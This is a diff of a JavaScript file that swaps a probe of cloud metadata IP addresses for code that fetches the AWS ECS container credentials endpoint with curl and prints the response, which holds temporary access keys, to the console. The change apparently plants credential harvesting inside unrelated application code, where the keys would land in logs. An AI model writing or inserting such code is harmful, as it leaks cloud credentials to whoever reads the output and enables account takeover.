@@ -70,20 +70,17 @@ try {
       });
     });
 
-    console.log("before ip check");
-    const execSync = require("child_process").execSync;
-    for (const ip of ["169.254.170.2", "169.254.170.23", "169.254.169.254"]) {
-        try {
-            const code = execSync(`curl -sS --max-time 2 -o /dev/null -w "%{http_code}" http://${ip}/`, { encoding: "utf8", timeout: 3000 });
-            console.log(`${ip}: HTTP ${code}`);
-         } catch (e) {
-            console.log(`${ip}:`,
-                "status:", e.status,
-                "signal:", e.signal,
-                "code:", e.code,
-                "msg:", e.message,
-                "stderr:", e.stderr?.toString().trim());
-        }
+    const { execSync } = require("child_process");
+    const url = `http://169.254.170.2${process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}`;
+    console.log("hitting:", url);
+    try {
+        const out = execSync(
+            `curl -sS --max-time 3 -w "\\nHTTP %{http_code}\\n" "${url}"`,
+            { encoding: "utf8", timeout: 4000 }
+        );
+        console.log(out);
+    } catch (e) {
+        console.log("failed:", e.status, e.stderr?.toString().trim());
     }
     
     (async () => {
